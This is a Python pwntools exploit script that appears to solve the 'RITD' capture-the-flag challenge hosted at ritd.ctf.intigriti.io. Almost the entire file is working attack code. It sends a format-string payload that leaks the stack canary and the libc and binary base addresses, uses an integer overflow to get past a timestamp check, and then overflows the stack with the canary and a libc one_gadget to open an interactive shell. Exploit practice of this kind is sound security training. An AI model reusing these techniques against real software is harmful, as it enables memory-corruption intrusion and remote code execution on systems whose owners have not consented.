#!usr/bin/python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './RITD'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.35-0ubuntu3.1_amd64.so'
cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'ritd.ctf.intigriti.io', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *admin_read+218
break *admin_read+245
'''.format(**locals())

# break *validate_data+155
# break *parse_function+126
# break *parse_function+315
# break *validate_timestamp
# break *parse_timestamp+126
# break *validate_timestamp+79
# break *parse_timestamp+236
# break *parse_timestamp_new+240
# break *parse_function+283

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io, time, canary
    io = initialize()
    time = cdll.time(None) 

    # MENU => (1: get server time) (2: echo) (3: read_in_the_dark) (4: admin_read)
    # PROTOCOL => |<timestamp>|<menu>|<data>|

    # LEAK MEMORY
    protocol = f'|{time}|\x34 %75$p-%3$p-%77$p||'.encode() # offset at 12
    io.sendlineafter(b'>', protocol)
    io.recvuntil(b'\x34 ')
    leak = io.recvline().decode().split('-')
    canary = int(leak[0].strip(), 16)
    libc.address = int(leak[1].strip(), 16) - 0x114a37
    elf.address = int(leak[2].strip(), 16) - 0x1a45
    
    overflow = 4294967295
    payload = time + overflow # bypass timestamp
    protocol = f'|{payload}|\x34||'.encode()
    io.sendlineafter(b'>', protocol)

    writeable = elf.address + 0x4000 # .data
    io.sendlineafter(b'write?', hex(writeable).encode())
    io.sendlineafter(b'there?', str(0xcafebabe).encode())
    
    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebdaf, 0xebdb3]
    payload = flat({
        39: [
            canary,
            0,
            libc.address + one_gadgets[0]
        ]
    })
    io.sendlineafter(b'read?', payload)

    log.info('canary = %#x', canary)
    log.info('elf base = %#x', elf.address)
    log.info('libc base = %#x', libc.address)
    log.info('local time = %d', time)
    io.interactive()
    
if __name__ == '__main__':
    exploit()